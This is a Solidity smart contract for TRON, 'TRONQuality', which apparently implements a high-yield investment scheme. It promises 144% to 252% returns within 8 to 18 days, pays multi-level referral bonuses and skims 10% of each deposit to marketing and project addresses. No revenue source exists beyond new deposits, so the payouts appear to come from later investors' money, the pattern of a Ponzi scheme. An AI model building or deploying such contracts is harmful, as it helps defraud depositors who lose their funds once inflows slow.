//SourceUnit: TRONQuality.sol

pragma solidity 0.5.10;

contract TRONQuality {
    
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint depositCount;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint MIN_DEPOSIT = 100 trx;
  uint MIN_WITHDRAW = 50 trx;
  uint START_AT = 26128260;
  
  address payable public marketingAddress;
  address payable public projectAddress;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  constructor(address payable marketingAddr, address payable projectAddr) public {
    require(!isContract(marketingAddr) && !isContract(projectAddr));
	marketingAddress = marketingAddr;
	projectAddress = projectAddr;
     
     tariffs.push(Tariff(8 * 28800, 144));
     tariffs.push(Tariff(12 * 28800, 192));
     tariffs.push(Tariff(18 * 28800, 252));
    
    refRewards.push(5);
    refRewards.push(3);
    refRewards.push(1);

  }
  
  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    require(investors[msg.sender].deposits.length < 200);
    
    register(referer);
    projectAddress.transfer(msg.value * 3 / 100);
    marketingAddress.transfer(msg.value * 7 / 100);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    investors[msg.sender].depositCount++;
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;
      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();
    require (amount >= MIN_WITHDRAW, "No minimun withdraw");
    msg.sender.transfer(amount);
    investors[msg.sender].withdrawn += amount;
    emit Withdraw(msg.sender, amount);
  }
  
  function getDeposit(address investor, uint index) external view returns (uint tariff, uint amount, uint at) {
    tariff = investors[investor].deposits[index].tariff;
    amount = investors[investor].deposits[index].amount;
    at = investors[investor].deposits[index].at;
  }
  
  function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}